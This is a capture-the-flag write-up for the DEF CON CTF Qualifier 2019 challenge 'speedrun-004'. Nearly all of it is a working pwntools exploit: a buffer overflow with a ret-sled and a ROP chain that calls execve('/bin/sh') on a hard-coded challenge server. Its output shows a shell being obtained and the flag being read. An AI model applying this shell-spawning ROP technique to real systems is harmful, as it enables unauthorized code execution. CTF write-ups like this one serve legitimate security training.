# DEF CON CTF Qualifier 2019

## speedrun-004

> Fast & Furious
>
> [speedrun-004](speedrun-004) [live here](https://archive.ooo/c/speedrun-004/306/)

Tags: _pwn_ _x86-64_ _rop_ _bof_ _retsled_

Exploit:

```python
#!/usr/bin/python3

from pwn import *

binary = context.binary = ELF('./speedrun-004')

pop_rax = next(binary.search(asm('pop rax; ret')))
pop_rdx = next(binary.search(asm('pop rdx; ret')))
pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi = next(binary.search(asm('pop rsi; ret')))
syscall = next(binary.search(asm('syscall')))
'''
# ropper --file speedrun-004 --nocolor | grep ": mov qword ptr \[r..\], r..; ret;"
0x000000000048d301: mov qword ptr [rax], rdx; ret;
0x000000000043895b: mov qword ptr [rdi], rcx; ret;
0x0000000000435ea3: mov qword ptr [rdi], rdx; ret;
0x000000000044788b: mov qword ptr [rdi], rsi; ret;
0x0000000000418c37: mov qword ptr [rdx], rax; ret;
0x000000000047f521: mov qword ptr [rsi], rax; ret;
'''
mov_ptr_rdi_rsi = next(binary.search(asm('mov qword ptr [rdi], rsi; ret')))

payload  = b''
payload += p64(pop_rax)
payload += p64(constants.SYS_execve)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(pop_rsi)
payload += b'/bin/sh\0'
payload += p64(mov_ptr_rdi_rsi)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

payload  = ((256 - len(payload)) // 8)*p64(pop_rdi+1) + payload + p8(0)

while True:
    # socat TCP-LISTEN:9999,reuseaddr,fork EXEC:$PWD/speedrun-004
    #p = remote('localhost', 9999)
    # archive.ooo
    p = remote('52.38.203.40', 31337)

    try:
        p.sendlineafter('say?\n','257')
        p.sendafter('self?\n',payload)
        p.recvline(timeout=0.5)
        time.sleep(.1)

        p.sendline('echo shell')
        if b'shell' in p.recvline():
            p.interactive()
            break
    except:
        p.close()
```

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/dc2019q/dc2019q-speedrun-004/service/speedrun-004'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 52.38.203.40 on port 31337: Done
[*] Closed connection to 52.38.203.40 port 31337
[+] Opening connection to 52.38.203.40 on port 31337: Done
[*] Switching to interactive mode
$ cat flag
OOO{Maybe ur lying to yourself. Maybe ur NoT the white hat pretending 2 be a black hat. Maybe you're the black hat pretending 2 be the white hat.}
```
